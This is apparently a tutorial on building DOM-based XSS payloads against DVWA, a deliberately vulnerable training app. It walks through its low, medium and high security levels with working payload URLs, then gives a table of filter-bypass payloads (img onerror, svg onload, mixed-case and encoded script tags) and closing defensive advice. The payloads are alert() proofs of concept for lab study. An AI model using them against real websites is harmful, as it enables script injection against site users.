
# 🧠 Understanding DOM-Based XSS Payload Construction

This guide explains how to analyze, deconstruct, and build DOM-based XSS (Cross-Site Scripting) payloads step-by-step using examples from DVWA.

---

## 📜 Vulnerable Code Context

From the DVWA DOM XSS page, we analyze this JavaScript:

```html
<script>
    if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
        document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    }
</script>
```

🔍 **This script does the following:**
- Reads the `default=` parameter from the URL.
- Writes it directly into the page using `document.write()` — without validation or sanitization.

---

## 🧪 Low Security – Payload

```
http://localhost/vulnerabilities/xss_d/?default=');<script>alert('hacked!');</script>//
```

### 🔎 Explanation
- `');` closes the `value` attribute.
- `<script>alert(...)</script>` injects JavaScript.
- `//` comments out remaining code.

🔧 **Resulting HTML:**
```html
<option value=''>
<script>alert('hacked!');</script>
</option>
```

✅ JavaScript executes successfully.

---

## 🛡️ Medium Security – Filter Bypass

```php
if (stripos ($default, "<script") !== false) {
    header("location: ?default=English");
}
```

### 🔎 Explanation
This code blocks requests containing `<script>`.

### ✅ Payload to bypass:
```
http://localhost/vulnerabilities/xss_d/?default=English</option></select><img src='x' onerror='alert(1)'>
```

🔧 **Trick**:
- Closes `<option>` and `<select>` cleanly.
- Injects `<img>` tag with an `onerror` handler.

✅ XSS triggers via `onerror`.

---

## 🔒 High Security – DOM-Based Whitelist Bypass

### 📌 Overview
In High Security mode, DVWA performs server-side filtering using a whitelist:

```php
switch ($_GET['default']) {
    case "French":
    case "English":
    case "German":
    case "Spanish":
        break;
    default:
        header ("location: ?default=English");
}
```

However, the **real vulnerability is client-side**, where JavaScript processes input from the URL — including the fragment (`#`) part.

### 🔎 JavaScript Vulnerability
```js
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
}
```

### 🔍 Why It’s Vulnerable
| 🔒 Vulnerability | ❌ Problem Description |
|------------------|------------------------|
| DOM-Based XSS | Input is inserted directly into HTML without sanitization |
| Server-Side Whitelist Ineffective | The browser executes JavaScript regardless of the PHP filter |
| Fragment Injection | Payloads after `#` are never sent to server, but parsed by JS |

---

### 🧪 Bypass Payload

```
http://localhost/vulnerabilities/xss_d/?default=English#<script>alert('hacked')</script>
```

🧩 Breakdown:
- PHP sees `default=English` — ✅ valid input.
- Browser sees full string (including `#...`).
- JavaScript inserts full string into DOM.

🔧 **Injected JavaScript:**
```js
var lang = 'English#<script>alert("hacked")</script>'
```

🔧 **HTML Rendered:**
```html
<option value='English#<script>alert("hacked")</script>'>
```

✅ Script is executed by browser.

---

## 🧰 How to Build DOM XSS Payloads – Step by Step

| Step | Action | Reason |
|------|--------|--------|
| 1️⃣ | Inspect the vulnerable JavaScript | Understand how it uses input |
| 2️⃣ | Identify the context (e.g., attribute, innerHTML) | Tailor the payload to fit that context |
| 3️⃣ | Break out of the current context | Use `'>`, `</option>`, etc. |
| 4️⃣ | Inject JavaScript | Use `<script>`, or event handlers like `onerror` |
| 5️⃣ | Neutralize rest of the code | Use comments (`//`) or clean closing tags |

---

## 🔐 Common XSS Filter Bypass Techniques

| Filter Type | Example Payload |
|-------------|------------------|
| Script tag blocked | `<img src=x onerror=alert(1)>` |
| Event handler injection | `<svg/onload=alert(1)>` |
| Attribute Injection | `' onfocus=alert(1) autofocus>` |
| Fragment injection | `#<script>alert(1)</script>` |
| Case-insensitive bypass | `<ScRipT>alert(1)</sCript>` |
| Double encoding | `%3Cscript%3Ealert(1)%3C/script%3E` |

---

## ✅ Final Notes

- DOM XSS arises from unsafe handling of `document.location`, `document.URL`, or user-controlled JS values.
- Always analyze **where** and **how** input is inserted.
- Be creative — use different HTML contexts, encodings, or events.

🔍 Protect against DOM XSS using:
- `textContent` instead of `innerHTML`
- Proper encoding libraries
- CSP (Content Security Policy)
- Avoiding use of `document.write()`

Stay sharp — DOM XSS lives in the shadows of the browser.

